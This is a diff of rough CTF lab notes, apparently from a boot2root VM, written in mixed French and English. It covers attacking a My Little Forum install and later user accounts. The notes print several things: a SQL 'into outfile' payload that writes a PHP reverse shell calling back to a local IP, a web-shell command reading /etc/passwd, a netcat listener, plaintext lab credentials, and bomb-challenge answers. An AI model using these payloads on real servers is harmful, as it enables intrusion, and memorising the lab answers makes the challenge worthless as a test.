@@ -119,7 +119,7 @@ Sur le Readme de My little forum https://github.com/ilosuna/mylittleforum on peu
 Upload the shell and goto /forum/templates_c/exploit.php?e=cat /etc/passwd
 
 reverse shell:
-SELECT "<?php $sock=fsockopen(\"192.168.1.242\",8090);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>" into outfile "/var/www/forum/templates_c/nat4.php";
+    SELECT "<?php $sock=fsockopen(\"192.168.1.242\",8090);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>" into outfile "/var/www/forum/templates_c/nat4.php";
 
 Set your listener:
     nc -lvnk 8081
@@ -164,11 +164,38 @@ That's enought to run some command like su or sudo but if you want an even bette
 
 dans /home/LOOKATME/password on trouve:
     lmezard:G!@M6f4Eatau{sF"
-Connect as lmezard with 
+
+Connect as lmezard with TODO wrong should not be root
     su lmezard
+
+Connect as lmezard via FTP:
+You could use Filezilla.
+
 
 Here we have a challenge. An executable that can gives us the next password
 
+Letters for the password. 
+aIwangeetprh
+
+    echo -n "Iheartpwnage" | shasum -a 256 | cut -d ' ' -f 1
+password = 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+
+ssh laurie@TARGET_IP 
+
+Now we are Laurie
+New challenge: diffuse the bomb
+
+    objdump -D -s -S -t --line-numbers -M intel bomb
+    readelf -x .rodata ./bomb
+
+Public speaking is very easy.
+1 2 6 24 120 720
+7 b 524
+9
+
+
+
+ 
 # Pour plus tard
 
 Checker le serveur VSFTPD
